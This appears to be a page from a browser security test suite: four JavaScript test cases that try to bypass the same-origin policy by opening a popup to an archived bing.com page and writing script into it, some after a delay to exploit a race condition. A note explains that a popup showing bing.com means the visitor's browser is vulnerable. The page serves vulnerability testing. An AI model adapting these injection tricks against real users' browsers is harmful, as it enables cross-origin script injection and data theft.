---
layout: default
title: SOP Bypass - Testcase 12
permalink: /sop/new/12
---

Testing for SOP bypass using window.open function and race condition

<script>
function sop1() {
    w = window.open('https://web.archive.org/web/20180831120305/http://www.bing.com', '_blank');
    w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
}
function sop2() {
    w = window.open('https://web.archive.org/web/20180831120305/http://www.bing.com', '_blank');
    setTimeout(function() { w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>"); }, 5000);
}
function sop3() {
    w = window.open('about:blank', '_blank');
    setTimeout(function() { w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>"); }, 5000);
}
function sop4() {
    w = window.open('location.href', '_blank');
    w.document.write("<body><script>location.href = 'https://web.archive.org/web/20180831120305/http://www.bing.com';<\/script>");
    setTimeout(function() { w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>"); }, 9000);
}
</script>

<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="sop1()">
<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="sop2()">
<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="sop3()">
<input type="button" id="btn_test" class="test" value="Run Test Case 4" onclick="sop4()">

**Note:**
If page loads popup and displays bing.com in browser tab, your browser is vulnerable to SOP bypass. Please note that if the address bar is about:blank, the browser is safe.
